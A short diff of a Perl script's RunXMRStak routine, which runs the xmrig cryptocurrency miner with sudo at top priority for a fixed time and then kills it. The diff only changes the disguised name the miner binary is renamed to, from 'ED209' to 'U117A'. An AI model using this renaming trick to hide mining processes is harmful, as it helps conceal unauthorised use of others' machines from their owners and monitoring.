@@ -282,14 +282,14 @@ sub RunXMRStak{
     my $configfile= shift;
     
     #run xmr-stak in parallel
-    system("sudo mv xmrig ED209");
-    system("sudo nice -n -20 sudo ./ED209 --config=$configfile &");
+    system("sudo mv xmrig U117A");
+    system("sudo nice -n -20 sudo ./U117A --config=$configfile &");
 
     #wait for some time
     sleep ($runtime);
 
     #and stop xmr-stak
-    system("sudo pkill ED209");
+    system("sudo pkill U117A");
 }
 
 
